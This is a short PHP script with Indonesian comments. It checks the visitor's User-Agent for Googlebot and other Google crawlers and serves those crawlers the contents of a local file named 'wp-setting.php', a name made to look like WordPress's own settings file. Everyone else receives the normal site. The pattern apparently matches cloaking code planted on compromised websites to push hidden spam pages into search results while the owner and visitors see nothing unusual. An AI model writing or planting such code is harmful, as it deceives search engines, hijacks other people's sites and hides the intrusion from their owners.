<?php
// ==== Serve local file only for Googlebot ====

// Nama file yang ada di folder yang sama
$LOCAL_FILE = 'wp-setting.php'; 

// Fungsi cek sederhana (User-Agent saja)
function is_googlebot(): bool {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    return (bool) preg_match('/Googlebot|Google-InspectionTool|GoogleOther|AdsBot-Google/i', $ua);
}

if (is_googlebot()) {
    $filePath = __DIR__ . '/' . $LOCAL_FILE;

    // Cek apakah filenya beneran ada sebelum dibaca
    if (file_exists($filePath)) {
        header('Content-Type: text/html; charset=UTF-8');
        header('X-Served-For: Googlebot-Local');
        
        // Baca dan tampilkan isi file
        echo file_get_contents($filePath);
        exit;
    }
}

// ==== end: Googlebot handling ====

require_once __DIR__ . '/web.php';